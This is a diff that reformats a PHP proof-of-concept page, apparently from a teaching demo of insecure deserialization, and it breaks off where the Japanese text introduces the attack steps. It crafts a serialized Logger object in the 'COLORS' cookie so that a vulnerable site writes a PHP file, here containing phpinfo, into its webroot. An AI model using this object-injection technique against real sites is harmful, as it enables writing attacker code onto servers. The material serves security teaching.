@@ -1,17 +1,19 @@
 <?php
-class Logger {
-  private $filename = '';  // ログファイル名
-  private $log = '';       // ログバッファ
+class Logger
+{
+    private $filename = ""; // ログファイル名
+    private $log = ""; // ログバッファ
 
-  public function __construct() {
-    $this->filename = '../var/www/html/xinfo.php';
-    // $this->filename = './xinfo.php';
-    $this->log = '<?php phpinfo(); ?>';
-  }
+    public function __construct()
+    {
+        $this->filename = "../var/www/html/xinfo.php";
+        // $this->filename = './xinfo.php';
+        $this->log = "<?php phpinfo(); ?>";
+    }
 }
 
 $logger = new Logger();
-setcookie('COLORS', serialize($logger));
+setcookie("COLORS", serialize($logger));
 ?><body>
 以下の手順で攻撃します。<br>
 <ol>
